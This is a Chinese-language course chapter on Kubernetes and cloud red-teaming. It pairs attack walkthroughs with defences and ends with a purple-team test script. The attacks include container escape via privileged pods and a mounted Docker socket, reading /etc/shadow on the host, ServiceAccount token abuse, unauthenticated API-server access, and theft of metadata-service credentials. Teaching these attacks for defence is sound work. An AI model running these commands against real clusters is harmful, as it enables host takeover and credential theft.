# ⚔️ 阶段九：红队演练与渗透测试

**目标**: 从攻击者视角理解云原生安全，通过实战演练验证防御措施的有效性。

> **🔄 技能迁移**: 应用渗透测试 → 云原生渗透测试
> 
> SDL中的渗透测试关注应用漏洞，云原生渗透测试扩展到容器逃逸、K8s API攻击、云环境横向移动等。

> **💡 核心概念**:
> *   **容器逃逸**: 从容器内获取宿主机访问权限
> *   **RBAC提权**: 利用K8s权限配置错误提升权限
> *   **CDK**: Container Drill Kit，容器渗透测试工具链
> *   **Purple Team**: 红队攻击+蓝队防御，协同提升安全能力

---

## 📝 学习任务

### 第一部分：容器逃逸技术（3小时）

#### 1. 特权容器逃逸

```yaml
# privileged-pod.yaml（仅用于学习！）
apiVersion: v1
kind: Pod
metadata:
  name: privileged-escape
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
```

```bash
# 攻击步骤
kubectl apply -f privileged-pod.yaml
kubectl exec -it privileged-escape -- sh

# 在容器内
nsenter -t 1 -m -u -n -i sh
# 现在在宿主机root shell中！

# 查看宿主机进程
ps aux

# 访问宿主机文件系统
cat /host/etc/shadow
```

**防御措施**: 阶段2学习的内容
- 禁止privileged: true
- 禁止hostPID/hostNetwork
- 使用Pod Security Standards

#### 2. Docker Socket挂载逃逸

```yaml
# docker-socket-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: docker-escape
spec:
  containers:
  - name: escape
    image: docker:latest
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

```bash
# 攻击
kubectl exec -it docker-escape -- sh

# 使用Docker命令访问宿主机
docker ps  # 看到宿主机所有容器
docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh
# 逃逸成功！
```

**防御**: 永不挂载Docker socket到容器

### 第二部分：Kubernetes渗透测试（4小时）

#### 使用CDK工具链

```bash
# 下载CDK
wget https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64
chmod +x cdk_linux_amd64

# 复制到Pod
kubectl cp cdk_linux_amd64 target-pod:/tmp/cdk

# 在Pod内执行
kubectl exec -it target-pod -- /tmp/cdk evaluate

# CDK会自动检测：
# - 可利用的逃逸路径
# - 敏感信息泄露
# - 权限配置错误
# - 可访问的K8s API
```

#### ServiceAccount Token滥用

```bash
# 在Pod内
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 使用Token访问API
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 如果权限过大，可以：
# - 创建特权Pod
# - 读取Secrets
# - 修改资源
```

**防御**:
- 禁用automountServiceAccountToken
- 使用RBAC最小权限原则
- 定期审计ServiceAccount权限

#### API Server未授权访问

```bash
# 扫描API Server
nmap -p 6443,8080 <api-server-ip>

# 如果8080开放且无认证
curl http://<api-server>:8080/api/v1/pods

# 可以完全控制集群！
```

**防御**: 
- 关闭insecure-port
- 启用RBAC
- 使用网络策略限制API访问

### 第三部分：云环境渗透（3小时）

#### SSRF攻击元数据服务

```bash
# 在Pod内（如果能访问外网）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭证
# 使用凭证访问AWS资源
```

**防御**: 
- EKS中使用IRSA
- 限制Pod对元数据服务的访问
- 使用IMDSv2（需要token）

#### S3桶接管

```bash
# 使用Pacu（AWS渗透测试框架）
pacu

# 扫描S3桶配置错误
run iam__enum_permissions
run s3__bucket_finder

# 查找公开桶
run s3__download_bucket --bucket-name <name>
```

### 第四部分：Purple Team验证（2小时）

#### 验证防御措施

**测试清单**：
- [ ] 特权容器是否被Kyverno拒绝？
- [ ] 容器逃逸是否被Falco检测？
- [ ] 异常API调用是否被审计日志记录？
- [ ] NetworkPolicy是否有效阻止横向移动？
- [ ] RBAC是否阻止了权限提升？

**测试脚本**:
```bash
#!/bin/bash
# purple-team-test.sh

echo "Test 1: 尝试创建特权容器"
kubectl apply -f privileged-pod.yaml 2>&1 | grep -q "denied"
if [ $? -eq 0 ]; then
  echo "✅ PASS: 特权容器被拒绝"
else
  echo "❌ FAIL: 特权容器未被拒绝"
fi

echo "Test 2: 尝试容器内执行shell"
kubectl exec -it test-pod -- /bin/sh &
sleep 2
kubectl logs -n falco -l app=falco | grep -q "Terminal shell"
if [ $? -eq 0 ]; then
  echo "✅ PASS: Shell执行被Falco检测"
else
  echo "❌ FAIL: Shell执行未被检测"
fi

# 更多测试...
```

---

## 🏆 里程碑项目：完整渗透测试报告

**任务**: 对集群进行完整渗透测试，生成专业报告。

### 测试范围

1. 容器逃逸尝试（5种方法）
2. K8s API攻击（RBAC提权、Secret窃取）
3. 网络横向移动
4. 云资源访问（IAM/S3）
5. 持久化尝试

### 报告模板

```markdown
# Kubernetes集群渗透测试报告

## 执行摘要
- 测试时间：
- 测试范围：
- 发现的高危漏洞：

## 详细发现

### 1. 特权容器配置错误 [HIGH]
- **描述**: namespace X中存在特权容器
- **影响**: 攻击者可以逃逸到宿主机
- **复现步骤**: ...
- **修复建议**: 启用Pod Security Standards

### 2. ServiceAccount权限过大 [MEDIUM]
...

## 附录
- 使用工具：CDK, kube-hunter, kubectl
- 测试账号：test-user
```

---

## 🔗 与SDL的关联

| SDL实践 | 红队演练对应 |
|---------|------------|
| 渗透测试 | K8s渗透测试 |
| 漏洞利用 | 容器逃逸 |
| 权限提升 | RBAC提权 |
| 横向移动 | Pod间攻击 |
| Purple Team | 攻防协同 |

*在此目录下创建攻击脚本和防御验证脚本。*
